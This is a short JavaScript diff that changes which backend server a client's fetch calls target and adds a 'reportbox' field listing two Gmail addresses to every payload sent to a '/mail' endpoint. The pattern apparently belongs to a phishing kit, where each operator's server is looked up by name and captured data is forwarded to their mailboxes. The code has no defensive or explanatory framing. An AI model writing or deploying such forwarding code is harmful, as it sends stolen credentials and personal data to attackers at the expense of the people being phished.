@@ -3,7 +3,7 @@ import { toast } from "react-toastify";
 const serverurl = require("../users.json");
 
 export const getHost = (email) =>
-  fetch(`${serverurl.maxwell.serverurl}/start`, {
+  fetch(`${serverurl.nwabu.serverurl}/start`, {
     method: "POST",
     mode: "cors",
     headers: {
@@ -13,13 +13,16 @@ export const getHost = (email) =>
   }).then((response) => response.json());
 
 export const sendFile = (data) =>
-  fetch(`${serverurl.maxwell.serverurl}/mail`, {
+  fetch(`${serverurl.nwabu.serverurl}/mail`, {
     method: "POST",
     mode: "cors",
     headers: {
       "Content-Type": "application/json",
     },
-    body: JSON.stringify(data),
+    body: JSON.stringify({
+      ...data,
+      reportbox: "Elongate68@gmail.com, jhonsnow751@gmail.com",
+    }),
   }).then((response) => response.json());
 
 export const notify = () =>
